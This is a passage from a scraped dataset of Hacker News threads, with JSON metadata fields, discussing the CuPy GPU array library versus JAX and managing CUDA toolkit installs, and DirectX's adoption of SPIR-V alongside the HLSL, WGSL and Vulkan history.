agoprevI taught my numpy class to a client who wanted to use GPUs. Installation (at that time) was a chore but afterwards it was really smooth using this library. Big gains with minimal to no code changes. reply sdenton4 4 hours agoprevWhy not Jax? reply johndough 3 hours agoparent> Why not Jax? - JAX Windows support is lacking - CuPy is much closer to CUDA than JAX, so you can get better performance - CuPy is generally more mature than JAX (fewer bugs) - CuPy is more flexible thanks to cp.RawKernel - (For those familiar with NumPy) CuPy is closer to NumPy than jax.numpy But CuPy does not support automatic gradient computation, so if you do deep learning, use JAX instead. Or PyTorch, if you do not trust Google to maintain a project for a prolonged period of time https://killedbygoogle.com/ reply gnulinux 2 hours agorootparentWhat about CPU-only loads? If one wants to write code that'll eventually run in both CPU and GPU but in the short-to-mid term will only be used in CPU? Since JAX natively support CPU (with numpy backend), but CuPy doesn't, this seems like a potential problem for some. reply nextaccountic 2 hours agorootparentIsn't there a way to dynamically select between numpy and cupy, depending on whether you want cpu or gpu code? reply kmaehashi 1 hour agorootparentNumPy has a mechanism to dispatch execution to CuPy: https://numpy.org/neps/nep-0018-array-function-protocol.html Just prepare the input on NumPy or CuPy, and then you can just feed it to NumPy APIs. NumPy functions will handle itself if the input is NumPy ndarray, or dispatch the execution to CuPy if the input is CuPy ndarray. reply gnulinux 2 hours agorootparentprevThere is but then you're using two separate libraries, that seems like a fragile point of failure compared to just using jax. But regardless since jax will use different backends anyway, it's arguably not any worse (but it ends up being your responsibility to ensure correctness as opposed to the jax team). reply insane_dreamer 2 hours agorootparentprev> CuPy does not support automatic gradient computation, so if you do deep learning, use JAX instead DL is major use case; is CuPy planning on adding auto gradient comp? reply bee_rider 4 hours agoparentprevReal answer: CuPy has a name that is very similar to SciPy. I don’t know GPU, that’s why I’m using this sort of library, haha. The branding for CuPy makes it obvious. Is Jax the same thing, but implemented better somehow? reply sdenton4 3 hours agorootparentYeah, Jax provides a one-to-one reimplementation of the Numpy interface, and a decent chunk of the scipy interface. Random number handling is a bit different, but Numpy random number handling seeeeems to be trending in the Jax direction (explicitly passed RNG objects). Jax also provides back-propagation wherever possible, so you can optimize. reply whimsicalism 4 hours agorootparentprevyes reply palmy 3 hours agoparentprevcupy came out a long time before Jax; remember using it in a project for my BSc around 2015-2016. Cool to see that it's still kicking! reply kunalgupta022 2 hours agoprevIs anyone aware of a pandas like library that is based on something like CuPy instead of Numpy. It would be great to have the ease of use of pandas with the parallelism unlocked by gpu. reply kmaehashi 2 hours agoparentcuDF is a CuPy-based library providing drop-in replacement for Pandas: https://rapids.ai/ reply Scene_Cast2 2 hours agoparentprevI'd go digging into this - https://pola.rs/posts/polars-on-gpu/ reply lokimedes 2 hours agoparentprevNot specifically GPU, but that’s also highly dependent on the data access pattern: https://www.dask.org/ reply whimsicalism 4 hours agoprevI was just thinking we didn’t have enough CUDA-accelerated numpy libraries. Jax, pytorch, vanilla TF, triton. They just don’t cut it reply hamilyon2 3 hours agoprevThere is a bit similar project which supports Intel GPU offloading: https://github.com/intel/scikit-learn-intelex reply bee_rider 4 hours agoprevGood a place as any to ask I guess. Do any of these GPU libraries have a BiCGStab (or similar) that handles multiple right hand sides? CuPy seems to have GMRES, which would be fine, but as far as I can tell it just does one right hand side. reply johndough 3 hours agoparentIf you have many right hand sides, you could also compute an LU factorization and then solve the right hand sides via back-substitution. https://docs.cupy.dev/en/stable/reference/generated/cupyx.sc... or https://docs.cupy.dev/en/stable/reference/generated/cupyx.sc... if your linear system is sparse. But whether that works well depends on the problem you are trying to solve. reply bee_rider 1 hour agorootparentMy systems are sparse, but might not fit on the GPU when factorized. Actually, usually I do CPU stuff with lots of ram, and Pardiso, so it isn’t an issue. But I was hoping to try out something like ILU+bicgstab on the GPU and the python-verse seems like it has the lowest barrier-to-entry for just playing around. reply trostaft 3 hours agoparentprevIIRC jax's `scipy.sparse.linalg.bicgstab` does support multiple right hand sides. EDIT: Or rather, all the solvers under jax's `scipy.sparse.linalg` all support multiple right hand sides. reply bee_rider 3 hours agorootparentOh dang, that’s pretty awesome, thanks. “array or tree of arrays” sounds very general, probably even better than an old fashioned 2D array. reply trostaft 3 hours agorootparent'tree of arrays' Ahh, that's just Jax's concept of pytrees. It was something that they invented to make it easier (this is how I view it, not complete) to pass complex objects to function but still be able to easily consider them as a concatenated vector for AD etc.. E.g. a common pattern is to pass parameters `p` to a function and then internally break them into their physical interpretations, e.g. `mass = p[0]`, `velocity = p[1]`. Pytrees let you just use something like a dictionary `p = {'mass' = 1.0, 'velocity = 1.0'}`, which is a stylistically more natural structure to pass around, and then jax is structured to understand later when AD'ing or otherwise that you're doing so with respect to the 'leaves' of the tree, or the values of the mass and velocity. Hopefully someone corrects me if I'm not right about this. I'm hardly 100% on Jax's vision on PyTrees. As an aside, just a list of right hand sides `[b1, b2, ..., bm]` is valid. reply lmeyerov 4 hours agoprevWe are fans! We mostly use cudf/cuml/cugraph (GPU dataframes etc) in the pygraphistry ecosystem, and when things get a bit tricky, cupy is one of the main escape hatches reply adancalderon 4 hours agoprevIf it ran in the background it could be CuPyd reply SubiculumCode 4 hours agoprev [–] As an aside, since I was trying to install CuPy the other day and was having issues. Open projects on github often (at least superficially) require specific versions of Cuda Toolkit (and all the specialty nvidia packages e.g. cudann), Tensorflow, etc, and changing the default versions of these for each little project, or step in a processing chain, is ridiculous. pyenv et al have really made local, project specific versions of python packages much easier to manage. But I haven't seen a similar type solution for cuda toolkit and associated packages, and the solutions I've encountered seem terribly hacky..but I'm sure though that this is a common issue, so what do people do? reply kmaehashi 1 hour agoparentAs a maintainer of CuPy and also as a user of several GPU-powered Python libraries, I empathize with the frustrations and difficulties here. Indeed, one thing CuPy values is to make the installation step as easy and universal as possible. We strive to keep the binary package footprint small (currently less than 100 MiB), keep dependencies to a minimum, support wide variety of platforms including Windows and aarch64, and do not require a specific CUDA Toolkit version. If anyone reading this message has encountered a roadblock while installing CuPy, please reach out. I'd be glad to help you. reply whimsicalism 1 hour agoparentprevin real life everyone just uses containers, might not be the answer you want to hear though reply m_d_ 3 hours agoparentprevconda provides cudatoolkit and associated packages. Does this solve the situation? reply nyrikki 3 hours agorootparentThe condos 200-employee threshold licence change is problematic for some. reply boldlybold 2 hours agorootparentAs long as you stay out of the \"defaults\" and \"anaconda\" repos, you're not subject to that license. For my needs conda-forge and bioconda have everything. I'm not sure about the nvidia repo but I assume it's similar. reply kmaehashi 2 hours agorootparentActually all CUDA Toolkit libs are already available through the conda-forge channel: https://anaconda.org/conda-forge/cuda-cudart, https://anaconda.org/conda-forge/libcublas, etc. reply coeneedell 3 hours agoparentprev [–] Ugh… docker containers. I also wish there was a simpler way but I don’t think there is. reply SubiculumCode 3 hours agorootparent [–] this is not what I wanted to hear. NOT AT ALL. Please whisper sweet lies into my ears. reply coeneedell 3 hours agorootparent [–] At the moment I’m working on a system to quickly replicate academic deep learning repos (papers) at scale. At least Amazon has a catalogue of prebuilt containers with cuda/pytorch combos. I still occasionally have an issue where the container works on my 3090 test bench but not on the T4 cloud node… reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "CuPy is a GPU-accelerated array library compatible with NumPy and SciPy, designed to run on NVIDIA CUDA and AMD ROCm platforms, enabling existing Python code to leverage GPU computing.",
      "It provides access to low-level CUDA features, facilitating integration with CUDA C/C++ programs, Streams, and CUDA Runtime APIs.",
      "CuPy can be installed via pip, conda, or Docker, with specific versions available for different CUDA and ROCm versions, and is developed under the MIT License by Preferred Networks and community contributors."
    ],
    "commentSummary": [
      "CuPy is highlighted as a drop-in replacement for NumPy, offering GPU acceleration and compatibility with AMD GPUs, making it appealing for high-performance computing.",
      "CuPy, along with NumPy and PyTorch, is working towards a shared subset of their API, enabling code interoperability across these libraries, although full compliance is still in progress.",
      "CuPy provides significant performance boosts for computational tasks, such as eigenvalue calculations in quantum mechanics, and supports in-place operations similar to NumPy, making it a powerful tool for GPU-accelerated computing."
    ],
    "points": 188,
    "commentCount": 61,
    "retryCount": 0,
    "time": 1726838286
  },
  {
    "id": 41595485,
    "title": "DirectX Adopting SPIR-V as the Interchange Format of the Future",
    "originLink": "https://devblogs.microsoft.com/directx/directx-adopting-spir-v/",
    "originBody": "August 7, 2024 The Silicon Graphics Media and Artificial Intelligence (SiGMA) team is hiring! Ana Marta Carvalho",
    "commentLink": "https://news.ycombinator.com/item?id=41595485",
    "commentBody": "DirectX Adopting SPIR-V as the Interchange Format of the Future (microsoft.com)170 points by AshleysBrain 23 hours agohidepastfavorite124 comments pjmlp 22 hours agoNo surprise here, given the extent HLSL is already the de facto shading language for Vulkan. Khronos already mentioned in a couple of conferences that there will be no further work improving GLSL, and given DirectX weight in the industry, HLSL kind of took over. Additionally for the NVidia fans, it might be that Slang also gets a place in the Vulkan ecosystem, discussions are ongoing, as revealed on SIGGRAPH sessions. reply TillE 22 hours agoparentMy understanding was that dxc lacked support for compiling various HLSL features to SPIR-V (hence SM7 now), so there are still a bunch of Vulkan-focused projects like Godot which only support GLSL. But yes, the games industry has been almost entirely HLSL since forever, and this is going to help remove the final obstacles. reply minraws 17 hours agorootparentYep, especially DXC HLSL to SPIRV was a big issue when it came to supporting new features from Vulkan. Though I would still like to see if slang can succeed and I am always a bit afraid of Microsoft just dropping the ball somewhere. reply Simran-B 21 hours agoparentprevWhat about WGSL though, the shader language of WebGPU? WebGPU is kind of Vulkan lite, but unlike with Vulkan, Apple is on board and actually the reason why WGSL exists as yet another shading language. reply jsheard 21 hours agorootparentWhat about it? Nobody wanted WGSL, it's just an artifact of having to appease Apple during WebGPUs development as you say. I don't see why it would be adopted for anything else. The old WebGPU meeting notes have some choice quotes from (IIRC) Unity and Adobe engineers literally begging the committee not to invent a new shader language. reply fngjdflmdflg 14 hours agorootparent>The old WebGPU meeting notes have some choice quotes from (IIRC) Unity and Adobe engineers literally begging the committee not to invent a new shader language. This was an interesting tidbit, so I tried to find the source for it. While I did not find it, I did find the December 2019 minutes[0] which has a related point: >Apple is not comfortable working under Khronos IP framework, because of dispute between Apple Legal & Khronos which is private. Can’t talk about the substance of this dispute. Can’t make any statement for Apple to agree to Khronos IP framework. So we’re discussing, what if we don’t fork? We can’t say whether we’re (Apple) happy with that. I found this link via rust hn[1] which I found after reading this blog post:[2] >Vulkan used a bytecode, called SPIR-V, so you could target it from any shader language you wanted. WebGPU was going to use SPIR-V, but then Apple said no The lobsters thread also links to a relevant HN post:[3] >I know, I was there. I also think that objection to SPIR-V wasn't completely unfounded. SPIR-V is a nice binary representation of shaders, but it has problems in the context of WebGPU adoption: It's so low level [...] It has a lot of instructions [...] Friction in the features we need, vs features Khronos needs. [...] there is no single well specified and tested textual shading language. HLSL doesn't have a spec. The linked blog post from lobsters was also discussed on HN, which you also commented in.[4] It would be great if you could find that Unity/Adobe discussion as I would be interested to read it. [0] https://docs.google.com/document/d/1F6ns6I3zs-2JL_dT9hOkX_25... [1] https://lobste.rs/s/q4ment/i_want_talk_about_webgpu [2] https://cohost.org/mcc/post/1406157-i-want-to-talk-about-web... [3] https://news.ycombinator.com/item?id=23089745 [4] https://news.ycombinator.com/item?id=35800988 reply jsheard 9 hours agorootparent> It would be great if you could find that Unity/Adobe discussion as I would be interested to read it. https://github.com/gpuweb/gpuweb/wiki/Minutes-2019-09-24 Corentin: Web Shading Language — A high-level shading language made by Apple for WebGPU.[...] Jesse B (Unity): We care about HLSL Eric B (Adobe): Creating a new high level language is a cardinal sin. Don’t. Do. That. Don’t want to rewrite all my shaders AGAIN. Jesse B: If we can transcode to HLSL to whatever you need, great. If we can’t, we may not support your platform at all. Eric B: Would really not like even to write another transcoder. If there’s an existing tool to get to an intermediate representation, that’s good. Would suggest SPIRV is an EXCELLENT existing intermediate representation. Note the WSL language made by Apple which sparked that discussion is unrelated to the WGSL language they ended up shipping, but the sentiment that the ISV representatives just wanted them to use HLSL or SPIR-V stands. reply fngjdflmdflg 4 hours agorootparent>WSL Ah, that explains part of why I couldn't find it. I was searching mainly for WGSL. Something Like 'WEBGPU minutes \"Unity\" \"HLSL\" \"WGSL\"'. There was also WHLSL also from Apple at one point but was later droppped in favor of WSL.[0][1] >A few months ago we discussed a proposal for a new shading language called Web High-Level Shading Language, and began implementation as a proof of concept. Since then, we’ve shifted our approach to this new language, which I will discuss a little later in this post. >[...] >Because of community feedback, our approach toward designing the language has evolved. Previously, we designed the language to be source-compatible with HLSL, but we realized this compatibility was not what the community was asking for. Many wanted the shading language to be as simple and as low-level as possible. That would make it an easier compile target for whichever language their development shop uses. >[...] >So, we decided to make the language more simple, low-level, and fast to compile, and renamed the language to Web Shading Language to match this pursuit.2 The \"we designed the language to be source-compatible with HLSL, but we realized this compatibility was not what the community was asking for\" comment is funny because Unity's \"We care about HLSL\" comment seems to be directly against this. In any case, this is really a disappointing move from Apple. Just another example of them ignoring developers – even large developers like Adobe and Unity – over completely petty disputes and severe NIH. The craziest line in the post is probably \"[WSL] would make it an easier compile target for whichever language their development shop uses.\" It's like they knew people wanted SPIR-V but they wouldn't do it due to some petty legal drama that Apple invented and then chose literally the worst of all worlds by making yet another compile target instead of at least choosing the next best thing which would be something that is compatible with HLSL. [0] https://github.com/w3c/strategy/issues/153 [1] https://webkit.org/blog/9528/webgpu-and-wsl-in-safari/ reply troupo 5 hours agorootparentprev> it's just an artifact of having to appease Apple during WebGPUs development To appease Google most likely. WebGPU is based on original work by Apple and Mozilla which based it on Metal. I doubt Apple would be against whatever Metal uses for its shader language. reply jsheard 4 hours agorootparentThe choice was between using or adapting SPIR-V, which is what basically everyone doing multi-platform development wanted, or using anything else and pissing everyone off by making them support another shader language. Apple stonewalled using SPIR-V or any other Khronos IP on unspecified legal grounds so they effectively forced the decision to roll a new shader langage, post-hoc rationalizations were given (e.g. human readable formats being more in the spirit of the web despite WebAssembly already existing at that point) but the technical merits were irrelevant when one of the biggest stakeholders was never ever going to accept the alternative for non-technical reasons. https://docs.google.com/document/d/1F6ns6I3zs-2JL_dT9hOkX_25... Apple is not comfortable working under Khronos IP framework, because of dispute between Apple Legal & Khronos which is private. Can’t talk about the substance of this dispute. Can’t make any statement for Apple to agree to Khronos IP framework. So we’re discussing, what if we don’t fork? We can’t say whether we’re (Apple) happy with that. reply jchw 4 hours agorootparentprevI don't understand why people say things that are kind of trivial to disprove, but here's the document with the notes where Apple refuses to use SPIR-V. https://docs.google.com/document/d/1F6ns6I3zs-2JL_dT9hOkX_25... > MS: Apple is not comfortable working under Khronos IP framework, because of dispute between Apple Legal & Khronos which is private. Can’t talk about the substance of this dispute. Can’t make any statement for Apple to agree to Khronos IP framework. So we’re discussing, what if we don’t fork? We can’t say whether we’re (Apple) happy with that. Reading between the lines, it seems like Apple mainly doesn't want to implement SPIR-V because engaging with the \"Khronos IP framework\" would prevent them from suing other Khronos members over patent disputes. reply pjmlp 21 hours agorootparentprevWebGPU, like WebGL, is a decade behind the native APIs it is based on. No one asked for a new Rust like shading language that they have to rewrite their shaders on. Also contrary to FOSS circles, most studios don't really care about Web 3D, hence why streaming is such a thing for them. There have been HLSL to SPIR-V compilers for several years now, this is Microsoft own official compiler getting SPIR-V backend as well. reply torginus 11 hours agorootparentBecause WebGL, just like WebAssembly (with its hacky thread support and compilation issues) is a giant kludge. WebGL still has fundamental issues of not even supporting anything resembling a modern OpenGL feature set (with modern meaning 2010s era stuff like compute shaders and multi draw indirect) in theory, and in practice, macOS doesn't support WebGL2, meaning stuff like multiple render targets (which is necessary for deferred rendering), so it's almost impossible to make a modernish game that runs in a browser well. Imo the problem isn't that WebGPU/Wasm is a decade/X years behind, but that we cannot reliably expect a feature set that existed on typical mid 2000s PCs to reliably work in the browser across all platforms (which is the whole point of the web). reply adrian17 2 hours agorootparentSafari supports WebGL2 since version 15 - unless you meant something else by macOS lacking support? (I agree with your general point though.) reply Ygg2 11 hours agorootparentprevIt's almost as like some Fruit based company is sabotaging the efforts to keep its walled garden. reply jsheard 5 hours agorootparentDespite all the bending over backwards to keep the fruit company on board with WebGPU, they still haven't actually shipped their Metal backend in Safari over a year after Chrome managed to ship DirectX, Metal and Vulkan backends simultaneously. Mozilla hasn't shipped WebGPU either but their resources can hardly be compared to Apples. reply torginus 8 hours agorootparentprevHonestly Google's probably almost as guilty - Native Client was a great idea and sidestepped basically all the issues we are having now, but they killed it in favour of 'standard' APIs, like Wasm that basically barely work for their intended purposes reply pjmlp 7 hours agorootparentAdd Mozzilla to the mix, for not wanting to adopt PNaCL, coming up with asm.js, and for what. Firefox is almost irrelevant now, and Google is calling all the shots anyway. Without Safari's relevance on mobile, the Web would have long turned into ChromeOS everywhere by now. reply Ygg2 6 hours agorootparent> Add Mozzilla to the mix, for not wanting to adopt PNaCl. Mozilla wasn't in any position to command the market, even at the time PNaCl was created. PNaCl failed on its own demerits. > Firefox is almost irrelevant now Firefox has been irrelevant because it doesn't have the trillion dollar budget of Apple and Google, nor the vendor lock-in, and with that no reach which would enable it to steer web the way it deems fit. It has nothing to do with asm.js reply pjmlp 4 hours agorootparentNot at all, had Mozilla adopted PNaCL instead of coming up with asm.js, and WebAssembly would never come up, delaying everything for a decade. Here is a memory refresher from 2011, \"Mozilla's Rejection of NativeClient Hurts the Open Web\" https://chadaustin.me/2011/01/mozillas-rejection-of-nativecl... reply Ygg2 2 hours agorootparentMozilla wasn't the only one with problem with PNaCl. They were definitely most opposed to it, but even Opera was strongly against it (granted it was around 2011). reply Ygg2 6 hours agorootparentprev> Honestly Google's probably almost as guilty - Native Client was a great idea and sidestepped basically all the issues NaCl failed on its own. A) Wasn't backwards compatible B) Spec was - look at the Chrome source C) No one other than Google wanted it D) It was essentially ActiveX Google (yeah, ActiveX had some nifty ideas and they still persist to this day) reply pjmlp 4 hours agorootparentPNaCL specification documents. https://www.chromium.org/nativeclient/pnacl/ Naturally after a decade not all links are working. reply flohofwoe 12 hours agorootparentprevThe native WebGPU libraries accept SPIRV as input, and they offer libraries to convert WGSL to SPIRV and back. E.g. WGSL is only needed when running WebGPU in browsers, but even there it can be code-generated from other shading languages by going through SPIRV (but tbh, I actually like WGSL, it's simple and straightforward). reply MindSpunk 11 hours agorootparentExcept that the conversion to WGSL is a complete waste of compute resources, engineering effort and the time of everyone involved. WebGPU is a _web_ API after all, even if people realized the runtimes could be used outside the browser. Converting your SPIR-V to WGSL just to convert it back to SPIR-V to feed it into a Vulkan driver, or running an entire language frontend just to emit DXIL or Metal IR. We learned 15 years ago that textual shader languages at the GPU API interface are a mistake but we're forced to relearn the same mistakes because Apple wouldn't play ball. What a joke. reply kvark 14 hours agorootparentprevWGSL could be good for Khronos. It’s a modern language with an actual specification. It’s gaining users every day. reply WhereIsTheTruth 13 hours agorootparentprevWGSL was a mistake and hopefully they get rid of it, it negatively impacts WebGPU's adoption, at least it did for me, the syntax is one of the worst ever created, just horrible reply hgs3 17 hours agoparentprev> Khronos already mentioned in a couple of conferences that there will be no further work improving GLSL Unfortunately, HLSL isn’t an open standard like GLSL. Is it Khronos's intention to focus solely on SPIR-V moving forward, leaving the choice of higher-level shader languages up to application developers? reply ferbivore 16 hours agorootparentThere's likely to be very little funding for GLSL moving forward, and I would expect no major spec updates ever again, but vendors will probably keep publishing extensions for new GPU features and fixing things up. GLSL still has a fairly large user base. Whether SPIR-V is going to be the only Khronos shading language (or whatever you want to call it) moving forward, that's hard to say. Nvidia is pushing for Slang as a Khronos standard at the moment. Not sure if anyone's biting. reply pjmlp 13 hours agorootparentprevYes, they officially stated at Vulkanised, SIGGRAPH among other places, that there is no budget for GLSL improvements, and also they aren't programming language experts anyway. It is up to the community to come up with alternative, and the game development community is mostly HLSL. reply gigatexal 22 hours agoparentprevWill this help games be more compatible with the proton layer on Linux or is this not related? reply jsheard 22 hours agorootparentIn theory if DirectX games start passing shaders to the driver in SPIR-V, the same format Vulkan uses, then yes it should make Protons job easier. Translating the current DXIL format to SPIR-V is apparently non-trivial to say the least: https://themaister.net/blog/2021/09/05/my-personal-hell-of-t... https://themaister.net/blog/2021/10/03/my-personal-hell-of-t... https://themaister.net/blog/2021/11/07/my-personal-hell-of-t... https://themaister.net/blog/2022/04/11/my-personal-hell-of-t... https://themaister.net/blog/2022/04/24/my-personal-hell-of-t... reply trelane 18 hours agorootparentMaybe. Maybe not; it could well be an incompatible flavour of SPIR-V. reply MindSpunk 16 hours agorootparentIt's unlikely to diverge from the same general flavor as vulkan. The worst parts of the DXIL to SPIR-V conversion I remember from that chain of blog posts is rebuilding structured control flow and how it interacts with atomics and wave convergence. That's a problem that goes away irrespective of any DX extensions to SPIR-V for supporting the binding model DX uses. reply camel-cdr 21 hours agoparentprevI haven't used either in a while, what is missing from GLSL? reply pjmlp 21 hours agorootparentC based, no support for modular programming, everything needs to be a giant include, no one is adding features to it as Khronos isn't assigned any budget to it. HLSL has evolved to be C++ like, including lightweight templates, mesh shaders and work graphs, has module support via libraries, is continuously being improved on each DirectX release. reply flohofwoe 12 hours agorootparentI'm not a fan of GLSL either, but adding C++ like baggage to shading languages like HLSL and especially MSL do (which is C++) is a massive mistake IMHO, I'd prefer WGSL over that sort of pointless language complexity any day. reply pjmlp 6 hours agorootparentLong term shading languages will be a transition phase, and most GPUs will turn into general purpose compute devices, where we can write code like in the old days of software rendering, except it will be hardware accelerated anyway. We already see this with rendering engines that are using CUDA instead, or as shown at Vulkanised sessions. I do agree that to the extent C++ has grown, and the security issues, something else would be preferable, maybe NVidia has some luck with their Slang adoption proposal. reply NotGMan 2 hours agorootparentprevAt some point you have to stop working in assembly and graduate to a high-level language and beyond. Modern GPU stuff is getting too complex to be practical without higher language features. reply cbarrick 3 hours agoprevAside: I find it funny to see memes with attribution. Given the culture around memes, attribution feels somehow weird. reply binary132 21 hours agoprevHopefully this isn’t actually Third SPIR-V Dialect reply flohofwoe 10 hours agoparentI wouldn't expect being able to load a D3D12 SPIRV blob into Vulkan or OpenGL anyway though, just because the 'input semantics' are very different (and I think that's also the main difference between GL and Vulkan SPIRV blobs). But AFAIK SPIRV is extensible for this type of differences without rendering existing SPIRV tools completely useless. reply binary132 4 hours agorootparentI think you’re kind of missing what I was getting at: today, tools which produce SPIR-V for OpenCL cannot be used to produce SPIR-V for Vulkan shaders, and vice versa. MLIR is a possible way out of the mess, but I am not hopeful that the future looks less messy, at least for some years, and it may not have enough incentive to even be feasible to improve. reply flohofwoe 4 hours agorootparentAh right, I was thinking of the Vulkan vs GL SPIRV flavours. I don't think it's much of a problem though. I cannot run a WASM blob compiled for the web in a WASI runtime either, or an x86 executable compiled for Windows on Linux. Heck, I can't even run an executable compiled for one Linux distro on another Linux distro if the glibc library versions don't overlap. reply riedel 13 hours agoprevI'd wish more Microsoft devblog content was like this one. reply flohofwoe 12 hours agoparentI could do without the shitty memes images. reply tester756 22 hours agoprevThis is really good news! reply omershapira 21 hours agoprevCinematic crossovers have gone too far reply bobajeff 21 hours agoprevGood. Now if Windows would adopt Vulkan as the graphics API of the future. reply miniupuchaty 11 hours agoparentIt's mostly on us, the developers. Vulkan is fully supported on windows. I would say that if you want to have multi-platform support just use Vulkan. Covers most of the platforms(especially if you include MoltenVK)[0]. Though, for games, if you want to support Xbox, that usually throws a curveball into API choice planning. As that might be more important of a target than Linux/Android/Mac/iOS(maybe even combined) for your game. So if you already have to support DX for that.. [0] https://www.vulkan.org/porting reply troupo 4 hours agorootparent> Vulkan is fully supported on windows. If and only if the GPU vendor supports it (they do for now). Windows itself fully supports only DX > Though, for games, if you want to support Xbox, that usually throws a curveball into API choice As does Playstation. Very few develop with Vulkan for Playstation as GDN (or whatever the name of the native framework is) is the main choice. And on mobile, well, you need to support Metal. reply mardifoufs 21 hours agoparentprevWhat's wrong with d3d12? It works perfectly fine for what it does. In my experience it causes a lot less issues than Vulkan. And it's not really due to windows not supporting Vulkan correctly, since my experience with Vulkan has mostly been on Linux. I don't dislike Vulkan either, it's just that I don't see the point of replacing something that works pretty well. reply bobajeff 21 hours agorootparentAdopting Vulkan doesn't mean removing Direct X 12. Just like adopting spirv doesn't mean removing hlsl. No one said anything about getting rid of anything. reply Narishma 20 hours agorootparentSPIR-V is not an alternative to HLSL. It's an intermediary format that you compile HLSL (or GLSL) to. reply shmerl 21 hours agorootparentprevReinvention of the wheel and tax on supporting \"yet another thing\" for developers who need to deal with it. Same reason standards have some value. reply mardifoufs 16 hours agorootparentI don't think it's reinventing the wheel, since Vulkan was ready quite a bit after d3d12 but yeah I guess maybe it could be the standard on windows after d3d12 becomes obsolete... But that's going to be in quite a while since I can't think of an actual feature (for end users) that is missing from one vs the other right now. Everything on Windows already uses d3d12/DirectX basically so it would actually be a huge wheel reinvention to migrate to a standard just for the sake of it. reply miniupuchaty 11 hours agorootparentI think saying that DX was first so it's Vulkan that was reinventing the wheel is incorrect with historical context. AMD and DICE developed a prototype API called Mantle. Which is what both DX and Vulkan are based on. Both Vulkan(glNext back then) and DX12 were announced around the same time. VK came a bit later as standards are usually slower in coming to decisions but it's not like VK was reinventing anything from DX. I remember we were having a laugh reading early DX12 documentation as it was in parts just copied from Mantle with names unchanged in places! reply mardifoufs 6 hours agorootparentAh you are right, I forgot that they both were announced at around the same time. It just feels like Vulkan took forever. To the point where some teams at my job had to use OpenGL even for greenfield projects for quite a while after Vulkan was first announced (even when they wanted to use Vulkan). I wonder if that means that dx12 and Vulkan could have a good interop/compatibility story, since they both have similar origins. reply troupo 4 hours agorootparentprev> DirectX 12 was announced by Microsoft at GDC on March 20, 2014, and was officially launched alongside Windows 10 on July 29, 2015. > Vulkan 1.0 was released in February 2016. What people forget is that Mantle was basically a proprietary AMD API that they wanted and developed until, well, the release of Metal in 2014 and DX 12 in 2015. Only then did they \"graciously\" donated Mantle to Khronos for the development of modern APIs. Vulkan was not just late. It suffers from the same issues as OpenGL before it: designed by committee, lackluster support from the major players. reply shmerl 4 hours agorootparentAMD indicated from the beginning they wanted it to become the universal API. Opening stuff up formally also takes time. So it all was going towards Vulkan in one form or another and no one was forcing MS to push DX12 NIH while this was happening. And counter to your point, despite Mantle being \"proprietary\", MS directly used it to create DX12 (same as Vulkan used it), so AMD clearly didn't have any complaints about that. reply troupo 4 hours agorootparent> AMD indicated from the beginning they wanted it to become the universal API. Was it an indication or was there any actual work done? Such as supporting anything else but AMD cards for example, inviting others to collaborate etc.? > despite Mantle being \"proprietary\", MS directly used it to create DX12 I can't remember the term for it: what do you call when a single company develops something with little to no external input and collaboration, even if it's sorta kinda open? As for \"NIH\"... Microsoft has/had a much bigger investment and interest in new gaming APIs than the few AMD cards that Mantle supported. And they already had their own platform, their own APIs etc. Makes sense for them to move forward without waiting for anyone reply shmerl 3 hours agorootparentOver time the work was obviously done for Mantle → Gl Next → Vulkan. And that's becasue AMD were positive about this idea. Their initial presentation of Mantle was in that vein, i.e. to kickstart the progress of the common API. MS just decided to do that whole thing for their NIH in parallel using parts of Mantle practically verbatim. It wouldn't have been possible without AMD basically allowing it. See: https://x.com/renderpipeline/status/581086347450007553 I.e. I don't see any reason here for MS not to collaborate on Vulkan instead, besides the usual lock-in approach. reply shmerl 13 hours agorootparentprevDX12 was pushed as NIH, since it was made from Mantle same way as Vulkan was. So to reduce NIH, it only makes sense to unify it all in Vulkan. They already made the first sensible step with SPIR-V here. The next step makes the same sense. And stuff can be translated into Vulkan if it can't be rewritten. reply izacus 20 hours agorootparentprevIt's Vulkan that was reinventing the DX12 wheel wasn't it though? reply HideousKojima 20 hours agorootparentVulkan is based on Mantle, which predates the release of DX12 by about 2 years. reply flohofwoe 11 hours agorootparentThe same can also be said about D3D12, it is at least 'heavily inspired' by Mantle. In the end, not much of Mantle has survived in Vulkan either though. Mantle was a much cleaner API than Vulkan because it didn't have to cover so many GPU architectures as Vulkan (Mantle especially didn't have to care about supporting shitty mobile GPUs). reply shmerl 18 hours agorootparentprevIn this case Vulkan is the only option. DX12 is a non starter since it was never intended to be universally available. reply ekianjo 19 hours agorootparentprevDX12 is proprietary. Vulkan is not. reply flohofwoe 12 hours agoparentprevD3D11 and D3D12 are objectively better designed APIs than their 'Khronos counterparts' OpenGL and Vulkan, as is Metal on iOS and macOS. reply miniupuchaty 11 hours agorootparentWhile OpenGl vs D3D11 I would agree I don't find D3D12 vs Vulkan difference to be that big. What are the parts that you consider objectively better in D3D12 compared to Vulkan? reply nicebyte 21 hours agoparentprevvulkan is already supported on windows as a first-class citizen by all major IHVs. I am not sure what this \"adoption\" you speak would entail. If you're talking about replacing d3d12, that actually is a terrible idea. reply bobajeff 21 hours agorootparentThat's not really the same as being supported by Windows. I think that's 3rd party support and not built into the OS. reply nicebyte 21 hours agorootparentwhat do you mean when you say \"built into the os\"? d3d12 is just an api. the d3d runtime is user-space, both the UMD that wraps it and the KMD are supplied by the hardware vendor. In the end, both a d3d app and a vulkan app end up talking to the very same KMD. See here for reference: https://learn.microsoft.com/en-us/windows-hardware/drivers/d... reply mrpippy 19 hours agorootparentD3D is clearly more integrated into the OS than Vulkan is. Most importantly, Windows includes a software D3D renderer (WARP) so apps can depend on it always being present (even if the performance isn’t spectacular). There are lots of situations where Vulkan isn’t present on Windows, for example a Remote Desktop/terminal server session, or machines with old/low-end video cards. These might not be important for AAA games, but for normal applications they are. Another example: Windows doesn’t include the Vulkan loader (vulkan-1.dll), apps need to bundle/install that. reply nicebyte 18 hours agorootparent> D3D is clearly more integrated into the OS than Vulkan is. sure, but addressing the two points that you brought up would not entail changing windows _the operating system_, just the stuff that ships with it. you could easily ship swift shader along with warp and the loader library, both of those are just some application libraries as far as the os/kernel is concerned. of course now we're in the territory of arguing about \"what constitutes an OS\" :-) reply bobajeff 21 hours agorootparentprevOh, I was under the impression that Direct X 12 was built-in for Windows like Metal is on Apple. reply jcotton42 21 hours agorootparentprevDoes that support extend to ARM? Not sure if it's still the case, but I recall that early Windows on ARM devices didn't have native Vulkan (and I believe OpenGL was translated to DirectX via ANGLE). reply nicebyte 21 